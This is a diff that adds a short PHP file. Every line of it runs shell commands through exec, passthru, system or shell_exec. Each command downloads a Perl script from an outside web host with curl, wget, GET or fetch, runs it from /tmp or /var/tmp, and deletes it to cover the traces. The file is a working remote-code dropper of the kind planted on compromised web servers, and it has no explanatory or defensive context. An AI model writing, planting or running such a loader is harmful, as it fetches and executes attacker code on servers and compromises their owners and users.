@@ -1,0 +1,34 @@
+<?php
+echo exec('cd /tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo exec('cd /tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo exec('cd /tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo exec('cd /tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo exec('cd /var/tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo exec('cd /var/tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo exec('cd /var/tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo exec('cd /var/tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /var/tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /var/tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /var/tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo passthru('cd /var/tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /var/tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /var/tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /var/tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo system('cd /var/tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /var/tmp;curl -O http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /var/tmp;GET http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /var/tmp;wget http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+echo shell_exec('cd /var/tmp;fetch http://www.techavtrust.co.za/shop/images/alat.txt;perl alat.txt;rm -rf alat.txt*;');
+?>
